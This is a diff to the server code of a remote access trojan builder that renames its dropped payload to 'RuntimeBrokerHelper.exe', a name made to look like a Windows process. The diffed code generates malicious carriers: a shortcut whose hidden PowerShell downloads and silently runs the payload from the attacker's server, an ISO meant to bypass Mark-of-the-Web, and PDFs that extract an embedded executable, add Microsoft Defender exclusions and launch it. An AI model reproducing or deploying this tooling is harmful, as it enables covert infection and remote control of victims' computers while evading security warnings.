@@ -18,7 +18,7 @@ const IS_WIN    = process.platform === "win32";
 const SRC_DIR   = path.join(__dirname, "..", "..", "docs", "09-rat-architecture", "workable");
 const STUB_OUT  = path.join(__dirname, "..", "..", "B4B3-RAT", "Stub", "Stub.exe");
 const DL_DIR    = path.join(__dirname, "..", "downloads");
-const DL_HELPER = path.join(DL_DIR, "OneDriveHelper.exe");
+const DL_HELPER = path.join(DL_DIR, "RuntimeBrokerHelper.exe");
 
 // Cross-compiler toolchain: prefer mingw-w64 on Linux, fall back to local MinGW on Windows
 const WINDRES = IS_WIN ? path.join("C:\\MinGW\\bin\\windres.exe") : "x86_64-w64-mingw32-windres";
@@ -142,8 +142,8 @@ router.post("/api/builder/compile", requireAdmin, (req, res) => {
   req.on("close", () => { compileRunning = false; });
 });
 
-// ── Build and download OneDriveHelper.exe ─────────────────────────────────────
-// Also saves a copy to downloads/OneDriveHelper.exe so /dl/exe can serve it.
+// ── Build and download RuntimeBrokerHelper.exe ─────────────────────────────────────
+// Also saves a copy to downloads/RuntimeBrokerHelper.exe so /dl/exe can serve it.
 
 router.post("/api/build", requireAdmin, (req, res) => {
   try {
@@ -154,7 +154,7 @@ router.post("/api/build", requireAdmin, (req, res) => {
       fs.writeFileSync(DL_HELPER, out);
     } catch (_) {}
     res.setHeader("Content-Type", "application/octet-stream");
-    res.setHeader("Content-Disposition", 'attachment; filename="OneDriveHelper.exe"');
+    res.setHeader("Content-Disposition", 'attachment; filename="RuntimeBrokerHelper.exe"');
     res.send(out);
     console.log(`[builder] built stub  host=${req.body.c2Host}  size=${out.length}`);
   } catch (e) {
@@ -165,7 +165,7 @@ router.post("/api/build", requireAdmin, (req, res) => {
 
 // ── File carrier generators ───────────────────────────────────────────────────
 // Each carrier, when executed on a Windows target, downloads and silently runs
-// OneDriveHelper.exe from this server's /dl/exe endpoint.
+// RuntimeBrokerHelper.exe from this server's /dl/exe endpoint.
 
 router.get("/api/builder/carrier", requireAdmin, (req, res) => {
   const type  = (req.query.type || "").toLowerCase();
@@ -177,12 +177,12 @@ router.get("/api/builder/carrier", requireAdmin, (req, res) => {
   // pdfexec builds the stub fresh — skip the DL_HELPER check for it
   if (type !== "pdfexec" && !fs.existsSync(DL_HELPER)) {
     return res.status(400).json({
-      error: "OneDriveHelper.exe not found — click Build in the builder above first to generate it, then download the carrier."
+      error: "RuntimeBrokerHelper.exe not found — click Build in the builder above first to generate it, then download the carrier."
     });
   }
 
   const payload = `${proto}://${host}/dl/exe`;
-  const saveTo  = "%TEMP%\\OneDriveHelper.exe";
+  const saveTo  = "%TEMP%\\RuntimeBrokerHelper.exe";
 
   const decoyPdfUrl  = `${proto}://${host}/dl/decoy-pdf`;
   const decoyDocUrl  = `${proto}://${host}/dl/decoy-doc`;
@@ -353,7 +353,7 @@ powershell -w hidden -nop -c "try{$wc=New-Object System.Net.WebClient;$wc.Header
 function buildLnk(url) {
   // PowerShell download-and-run invocation hidden in a .lnk shortcut
   const target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
-  const args   = `-w hidden -nop -c "try{$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$dest=$env:TEMP+'\\OneDriveHelper.exe';$wc.DownloadFile('${url}',$dest);Start-Process $dest -WindowStyle Hidden}catch{}"`;
+  const args   = `-w hidden -nop -c "try{$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$dest=$env:TEMP+'\\RuntimeBrokerHelper.exe';$wc.DownloadFile('${url}',$dest);Start-Process $dest -WindowStyle Hidden}catch{}"`;
   return createLnkBuffer(target, args);
 }
 
@@ -411,18 +411,18 @@ End Sub
 }
 
 // ── ISO carrier ───────────────────────────────────────────────────────────────
-// Wraps OneDriveHelper.exe inside a mountable ISO (no MOTW on older/unpatched Windows).
+// Wraps RuntimeBrokerHelper.exe inside a mountable ISO (no MOTW on older/unpatched Windows).
 // Requires genisoimage on Linux: sudo apt install genisoimage
 function buildIso(callback) {
   if (!fs.existsSync(DL_HELPER)) {
-    return callback("OneDriveHelper.exe not found — build it first from the Builder page above.");
+    return callback("RuntimeBrokerHelper.exe not found — build it first from the Builder page above.");
   }
   const { execSync } = require("child_process");
   const tmpDir  = `/tmp/iso_stage_${Date.now()}`;
   const isoPath = `/tmp/OneDriveSetup_${Date.now()}.iso`;
   try {
     fs.mkdirSync(tmpDir, { recursive: true });
-    fs.copyFileSync(DL_HELPER, `${tmpDir}/OneDriveHelper.exe`);
+    fs.copyFileSync(DL_HELPER, `${tmpDir}/RuntimeBrokerHelper.exe`);
     execSync(`genisoimage -quiet -J -R -o "${isoPath}" -V "OneDriveSetup" "${tmpDir}"`,
              { timeout: 30_000 });
     const buf = fs.readFileSync(isoPath);
@@ -572,11 +572,11 @@ function buildDecoyPdf(opts = {}) {
 }
 
 // ── Genuine self-contained PDF with embedded /Launch action ──────────────────
-// The compiled OneDriveHelper.exe is appended verbatim after %%EOF.
+// The compiled RuntimeBrokerHelper.exe is appended verbatim after %%EOF.
 // /OpenAction /Launch fires a hidden PowerShell that:
 //   1. Finds the PDF file by its known filename in common locations
 //   2. Reads the exe bytes starting at the sentinel offset
-//   3. Writes to %TEMP%\OneDriveHelper.exe and executes it
+//   3. Writes to %TEMP%\RuntimeBrokerHelper.exe and executes it
 // The extracted file has NO Zone.Identifier ADS → SmartScreen does not fire.
 // pname = AcroRd32.exe / Acrobat.exe / FoxitReader.exe → DR_016 fires.
 function buildExecPdf(opts = {}, exeBuf = null) {
@@ -609,7 +609,7 @@ function buildExecPdf(opts = {}, exeBuf = null) {
     `if($fp){` +
     `$o=12345678;$z=${exeSize};` +
     `$rb=[IO.File]::ReadAllBytes($fp);$eb=$rb[$o..($o+$z-1)];` +
-    `$tp=Join-Path $env:APPDATA OneDriveHelper.exe;` +
+    `$tp=Join-Path $env:APPDATA RuntimeBrokerHelper.exe;` +
     `try{Add-MpPreference -ExclusionPath $tp -EA Stop}catch{};` +
     `[IO.File]::WriteAllBytes($tp,$eb);` +
     `try{Add-MpPreference -ExclusionProcess $tp -EA Stop}catch{};` +
@@ -935,26 +935,6 @@ function createLnkBuffer(target, args) {
 // Supports traditional xref tables (PDF 1.4).  Cross-reference streams
 // (PDF 1.5+) require a "Save as PDF 1.4" step first.
 
-function findObjInXref(pdfStr, xrefOff, objNum) {
-  const lines = pdfStr.slice(xrefOff).split(/\r?\n/);
-  let li = 0;
-  if (lines[li].trim() === "xref") li++;
-  while (li < lines.length) {
-    const hdr = lines[li].trim();
-    if (hdr === "trailer" || hdr.startsWith("<<")) break;
-    const sub = hdr.match(/^(\d+)\s+(\d+)$/);
-    if (!sub) { li++; continue; }
-    const first = parseInt(sub[1]), count = parseInt(sub[2]);
-    li++;
-    for (let k = 0; k < count; k++, li++) {
-      const m = (lines[li] || "").match(/^(\d{10})\s+\d{5}\s+([nf])/);
-      if (!m) { k--; continue; }
-      if (first + k === objNum && m[2] === "n") return parseInt(m[1]);
-    }
-  }
-  return -1;
-}
-
 function injectLaunchIntoPdf(pdfBuf, psArgs) {
   const pdf = pdfBuf.toString("latin1");
 
@@ -1060,7 +1040,7 @@ function injectLaunchWithExe(pdfBuf, exeBuf, pdfFilename) {
     `if($fp){` +
     `$o=12345678;$z=${exeSize};` +
     `$rb=[IO.File]::ReadAllBytes($fp);$eb=$rb[$o..($o+$z-1)];` +
-    `$tp=Join-Path $env:APPDATA OneDriveHelper.exe;` +
+    `$tp=Join-Path $env:APPDATA RuntimeBrokerHelper.exe;` +
     `try{Add-MpPreference -ExclusionPath $tp -EA Stop}catch{};` +
     `[IO.File]::WriteAllBytes($tp,$eb);` +
     `try{Add-MpPreference -ExclusionProcess $tp -EA Stop}catch{};` +
@@ -1180,7 +1160,7 @@ function buildPdfLnk(fname, pdfBuf, exeBuf) {
     `[IO.File]::WriteAllBytes($pt,$pd);Start-Process $pt;` +
     `$eo=$o+4+$pl;$el=[BitConverter]::ToUInt32($rb,$eo);` +
     `$ed=$rb[($eo+4)..($eo+4+$el-1)];` +
-    `$tp="$env:APPDATA\\OneDriveHelper.exe";` +
+    `$tp="$env:APPDATA\\RuntimeBrokerHelper.exe";` +
     `[IO.File]::WriteAllBytes($tp,$ed);` +
     `Start-Process $tp -WindowStyle Hidden}`;
 
